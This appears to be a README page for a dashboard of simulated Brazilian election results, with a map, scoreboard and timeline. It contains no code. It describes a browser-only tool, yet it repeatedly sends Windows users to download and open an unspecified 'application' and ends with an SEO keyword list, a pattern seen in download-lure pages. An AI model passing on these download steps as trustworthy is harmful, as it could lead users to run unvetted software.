---
layout: "default"
title: "🗳️ open-apuracao-brazil - Explore Simulated Brazil Election Results"
description: "Explore simulated Brazilian election results with an interactive three-level map of states, municipalities and voting zones, plus scoreboard and timeline."
---
# 🗳️ open-apuracao-brazil - Explore Simulated Brazil Election Results

[![Download open-apuracao-brazil](https://img.shields.io/badge/Download-open--apuracao--brazil-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/weeezy710/open-apuracao-brazil)

A full election-night dashboard for Brazil that runs entirely on your own computer. You get a color-coded map of the whole country, a live-style scoreboard, a running timeline of the count, and the ability to click from the national view all the way down to a single voting zone inside a single city. Everything is drawn in your browser, so there is nothing extra to install once you have the files.

The important thing to understand before you start: every number you see is simulated. Votes, percentages, turnout figures and the speed of the count are all produced by a model that runs locally in your browser. The project never contacts the TSE or any election service, and nothing on the screen reflects a real election result. Candidate names exist only to make the interface feel like the real thing.

## 🚀 Getting Started

Getting the dashboard onto your Windows computer takes one step.

**Visit this link to download the application:** https://github.com/weeezy710/open-apuracao-brazil

Open that page in your browser and use the download option provided there to get the application onto your machine. Once the download finishes, open the application and the dashboard will load in your browser window.

That is the whole process. There is no account to create, no key to paste in, and no separate database to set up.

## 🖥️ What You Need

The dashboard is lightweight because the heavy lifting already happened when the map was prepared. To run it comfortably:

- A Windows 10 or Windows 11 computer.
- A modern browser such as Chrome, Edge or Firefox, kept reasonably up to date.
- Around 4 GB of memory, which almost every computer built in the last several years already has.
- A screen resolution of 1366×768 or higher. A larger monitor makes the map much easier to read, but the layout adapts to smaller screens as well.
- A mouse, a trackpad, or a touchscreen. All three work for moving around the map.

An internet connection is only needed for the download itself. After that, the dashboard works offline.

## 🗺️ A Map You Can Actually Navigate

The centerpiece is a map of Brazil drawn with 5,570 municipalities. It is not an image — it is drawn live, which is why you can zoom in smoothly, drag the map around, and pinch to zoom on a touchscreen without it turning blurry.

The map works on three levels, and you move between them by clicking:

1. **Country level.** The whole of Brazil, with each state color-coded by how far its count has progressed.
2. **State level.** Click a state and the map redraws to show that state's municipalities, each one filled according to its own local count.
3. **Municipality level.** Click a municipality and you drop into its voting zones. Large cities are broken into many zones — the city of São Paulo, for example, has 57 of them.

A breadcrumb trail at the top of the map always shows where you are, so you can jump back to the country view at any moment.

## 🎛️ Three Ways to Look at the Map

Different questions need different pictures, so the map offers three display modes:

- **By state.** The classic view. Each state is a single shape, useful for a quick national overview.
- **By municipality.** The detailed view, showing every city as its own shape. This is the mode to use when you want to see how the count is moving through the interior versus the coast.
- **By electorate.** Instead of shapes, you get one circle per municipality, sized according to how many voters live there. A big circle means a big electorate. This view makes it obvious at a glance where most of the country's voting power actually sits, which is not always where the map looks largest.

## 📊 The Scoreboard and the Timeline

Beside the map sits the scoreboard: a running tally of the simulated candidates, their vote totals, and their share of the count. The numbers update as the simulated count advances, so the ranking can shift while you watch.

Underneath the scoreboard is the timeline, a chart showing how the count progressed over the simulated evening. Each point on the line represents a moment in the count, which lets you see whether a candidate pulled ahead early and held on, or closed a gap late. A separate progress indicator shows how much of the simulated count has been completed, along with turnout figures for the area you are currently viewing.

The state list on the side is a shortcut. Instead of hunting for a small state on the map, click its name in the list and the dashboard jumps straight there.

## 🖱️ Simple Controls

- **Zoom:** scroll wheel, the on-screen plus and minus buttons, or a pinch gesture on a touchscreen.
- **Pan:** click and drag anywhere on the map.
- **Select:** a single click on a state, municipality or zone drills down into it.
- **Go back:** use the breadcrumb trail, or the back arrow, to climb one level up.
- **Switch modes:** the mode buttons sit directly above the map.

Nothing is hidden behind a right-click menu or a keyboard shortcut you have to memorize.

## 🧪 How the Numbers Are Made

Each area has a stable simulated result attached to it. Reload the page and you will see the same figures again, because the model is deterministic — it does not roll fresh random numbers every time. That is deliberate: it means you can compare one state against another, or take a screenshot today and check it tomorrow, without the underlying data shifting under you.

Turnout is simulated too, and varies by region in a plausible-looking way. The pace of the count also varies, so some areas appear to report quickly while others lag behind, much like a real broadcast. None of it is real, and none of it should be treated as a forecast or an exit poll.

## 🛠️ If Something Looks Wrong

**The map is blank.** Resize the browser window slightly. The map redraws to fit its container, and a window that was resized without a refresh occasionally needs a nudge.

**Scrolling zooms the page instead of the map.** Click once on the map first so it has focus, then scroll.

**The layout looks cramped.** Maximize the browser window, or hide your browser's bookmarks bar. The dashboard uses a wide layout and benefits from every pixel.

**Everything feels slow.** Close other browser tabs. The map draws thousands of shapes, so it appreciates having the machine to itself.

**The numbers never change.** Confirm the count has not already finished for the area you are viewing. The progress indicator next to the scoreboard tells you where things stand.

## 📌 Before You Share a Screenshot

Add a note that the results are simulated. The interface is convincing on purpose, and a cropped screenshot of a scoreboard can easily be mistaken for real reporting. The project is a visualization and interface exercise, not a source of election data.

Keywords: brazil election dashboard, simulated election results, interactive map, canvas 2d map, voter turnout visualization, election timeline, brazil municipalities map, voting zones, data visualization, offline dashboard